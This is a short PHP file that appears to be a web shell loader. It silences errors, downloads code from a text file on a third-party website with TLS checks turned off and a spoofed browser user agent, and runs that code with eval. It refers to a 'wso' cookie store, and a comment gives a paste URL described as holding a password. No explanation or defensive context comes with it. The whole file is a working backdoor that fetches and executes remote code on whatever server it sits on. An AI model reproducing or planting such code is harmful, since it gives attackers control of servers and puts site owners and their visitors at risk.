<?php
error_reporting(0);
function get_contents($url){
  $ch = curl_init("$url");
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEJAR,$GLOBALS['wso']);
  curl_setopt($ch, CURLOPT_COOKIEFILE,$GLOBALS['wso']);
  $result = curl_exec($ch);
  return $result;
}
// with pass => https://5496d0d09d12b129.paste.se/raw
$a = get_contents('https://www.rippysbarandgrill.com//admin/lib/_notes/sys.txt');
eval('?>'.$a);
